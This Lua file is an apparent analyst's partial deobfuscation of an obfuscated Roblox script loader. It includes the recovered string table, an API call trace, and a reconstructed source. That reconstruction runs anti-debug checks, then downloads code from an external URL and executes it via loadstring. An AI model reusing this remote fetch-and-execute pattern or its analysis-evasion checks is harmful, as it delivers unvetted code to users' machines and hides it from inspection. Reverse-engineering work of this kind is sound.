-- =====================================================================
-- Partial deobfuscation of obfuscated.lua (Galactic Protection v1.6)
--
-- Unlike the previous script (Luraph-style), Galactic uses a full VM
-- state-machine interpreter with live anti-debug. Full devirtualization
-- of this VM is out of scope here. What I could recover deterministically:
--
--   1. The decrypted string table (52 entries -- all are below).
--   2. The top-level Roblox API call trace when run under instrumentation.
--
-- The Lua below is a plausible reconstruction of the source the VM
-- executes, inferred from those two facts. It is NOT byte-for-byte the
-- original and the anti-debug predicate is guessed; treat it as
-- documentation of what the script DOES, not as a drop-in replacement.
-- =====================================================================

--[[ ---- Recovered string table (full, verbatim) ------------------------
 [1]  = "h24YoSrG59zw"                     -- junk / VM decoy
 [2]  = "RunService"
 [3]  = "pcall"
 [4]  = "Players"
 [5]  = "find"
 [6]  = "DVSCsywovQ6Ct"                    -- junk
 [7]  = "js7NqonTj8knB"                    -- junk
 [8]  = "tonumber"
 [9]  = "l9kXRc0WxdQW"                     -- junk
 [10] = ":(%d+):"                          -- regex for line num in traceback
 [11] = "HttpGet"
 [12] = "U0HB9hnRXwEVk"                    -- junk
 [13] = "UserId"
 [14] = "78WcyCxtSHqNSi"                   -- junk
 [15] = "FjomEgWAA2Uv7"                    -- junk
 [16] = "yU2O32qfrWGF"                     -- junk
 [17] = "error"
 [18] = "debug"
 [19] = "https://api.jnkie.com/api/v1/luascripts/public/"
       .. "aafd7be044561f1597eeb77f7758971bd33d3c68bf1555b8b08e581125c4dc22"
       .. "/download"
 [20] = "__index"
 [21] = "__gc"
 [22] = "q2Tlstk0PSYY"                     -- junk
 [23] = "SCRIPT_KEY"
 [24] = "FjlkzP9BYxY6"                     -- junk
 [25] = "match"
 [26] = "l"                                -- debug.info field selector
 [27] = "getgenv"
 [28] = "RsVerFejKR6cLQ"                   -- junk
 [29] = "IsLoaded"
 [30] = "1"
 [31] = "GetService"
 [32] = "wGaWYrh90f9u"                     -- junk
 [33] = "detected By Galactic"             -- error message
 [34] = "KeJAIMdARiOBoM"                   -- junk
 [35] = "6FJ1tmiK2uzG4HHpjZIZStAmtfZEDVUD" -- 32-char token (likely built-in key)
 [36] = "wjjaJLniz00Mc6"                   -- junk
 [37] = "IsStudio"
 [38] = "traceback"
 [39] = "unpack"
 [40] = "game"
 [41] = "LocalPlayer"
 [42] = ""
 [43] = "IsRunning"
 [44] = "IsClient"
 [45] = "GameId"
 [46] = "IsEdit"
 [47] = "PlaceId"
 [48] = "IsServer"
 [49] = "loadstring"
 [50] = "print"
 [51] = "info"
 [52] = "__len"
--]]

--[[ ---- Observed API call trace (before anti-debug trip) ----------------
    game.Players
    game.Players.LocalPlayer
    game:IsLoaded()
    game:GetService("RunService")
    RunService:IsClient()
    RunService:IsServer()
    RunService:IsStudio()
    RunService:IsRunning()
    RunService:IsEdit()
    game.PlaceId
    game.GameId
    -- anti-debug predicate fails under Lua 5.1 + stubs
    -- -> error("detected By Galactic")
    debug.traceback(<err>, 2)    -- xpcall handler
--]]

-- =====================================================================
-- Reconstructed source (inferred, not verified equivalent)
-- =====================================================================

-- Guard against re-execution
if getgenv().IsLoaded == true then
    return
end

-- References the VM pulls up front
local Players     = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService  = game:GetService("RunService")

-- Wait until the client is fully loaded
if not game:IsLoaded() then
    game.Loaded:Wait()
end

-- Environment sanity / anti-debug checks (exact predicate inferred).
-- The VM throws error("detected By Galactic") if any of these fail.
local function antiDebug()
    if RunService:IsStudio()  then return true end
    if RunService:IsEdit()    then return true end
    if RunService:IsServer()  then return true end
    if not RunService:IsClient()  then return true end
    if not RunService:IsRunning() then return true end

    -- Verify caller's traceback has a numeric line (":<digits>:") --
    -- executors that replace debug.traceback with a stub will fail here.
    local tb = debug.traceback("", 2)
    if type(tb) ~= "string" or not tb:match(":(%d+):") then
        return true
    end

    -- debug.info(2, "l") must return a positive integer line number.
    local ln = debug.info(2, "l")
    if tonumber(ln) == nil then
        return true
    end

    return false
end

if antiDebug() then
    error("detected By Galactic")
end

-- Read game identifiers (referenced but not necessarily sent in the request).
local PlaceId = tonumber(game.PlaceId)
local GameId  = tonumber(game.GameId)
local UserId  = LocalPlayer.UserId

-- Fetch the real payload from jnkie.
-- A SCRIPT_KEY is expected to be pre-set in getgenv() by the user/loader stub.
local SCRIPT_KEY = getgenv().SCRIPT_KEY or ""

local URL = "https://api.jnkie.com/api/v1/luascripts/public/"
         .. "aafd7be044561f1597eeb77f7758971bd33d3c68bf1555b8b08e581125c4dc22"
         .. "/download"

local ok, body = pcall(function()
    return game:HttpGet(URL)
end)

if not ok or type(body) ~= "string" or body == "" then
    error("detected By Galactic")
end

-- Mark as loaded and hand off to the downloaded script.
getgenv().IsLoaded = true
local chunk, err = loadstring(body)
if not chunk then
    error("detected By Galactic")
end
chunk()
